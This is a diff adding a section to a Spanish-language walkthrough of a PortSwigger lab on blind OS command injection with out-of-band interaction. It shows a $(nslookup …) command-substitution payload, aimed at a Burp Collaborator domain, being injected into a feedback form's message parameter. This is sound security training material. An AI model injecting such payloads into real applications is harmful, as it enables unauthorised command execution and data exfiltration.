@@ -114,3 +114,39 @@ Ahora si vamos a la pagina principal del laboratorio vemos que se realizó corre
 
 ## 4. Lab: Blind OS command injection with out-of-band interaction
 
+```bash
+Esta práctica de laboratorio contiene una vulnerabilidad de inyección ciega de comandos del sistema operativo en la función de retroalimentación.
+
+La aplicación ejecuta un comando de shell que contiene los detalles proporcionados por el usuario. El comando se ejecuta de forma asincrónica y no tiene ningún efecto en la respuesta de la aplicación. No es posible redirigir la salida a una ubicación a la que pueda acceder. Sin embargo, puede desencadenar interacciones fuera de banda con un dominio externo.
+
+Para resolver el laboratorio, aproveche la vulnerabilidad de inyección ciega de comandos del sistema operativo para emitir una búsqueda de DNS en Burp Collaborator.
+```
+
+Entonces, necesitamo buscar la seccion de **Burp Collaborator**, para ello nos ubicamos en la pestaña **Burp** y en la opcion **Burp Collaborator Client**.  y le damos clic en **Copy to clipboard**, con lo cual obtenemos el siguiente:
+
+```bash
+z66dbyatv2hji73k2colx34jua00op.burpcollaborator.net
+```
+
+Ahora, vamos a interceptar el paquete del feedback y lo enviamos al repeater editando el parametro **message** por lo siguiente.
+
+```bash
+$(nslookup z66dbyatv2hji73k2colx34jua00op.burpcollaborator.net)
+```
+
+Como se ve en la siguiente imagen:
+
+![](img14.png)
+
+Podemos ver en nuestra ventana de **Burp Collaborator Client**, podemos ver que si se realizaron las consultas dns.
+
+![](img15.png)
+
+Ahora verificamos en el home del laboratorio si lo completamos.
+
+![](img16.png)
+
+## 5. Lab: Blind OS command injection with out-of-band data exfiltration
+
+
+
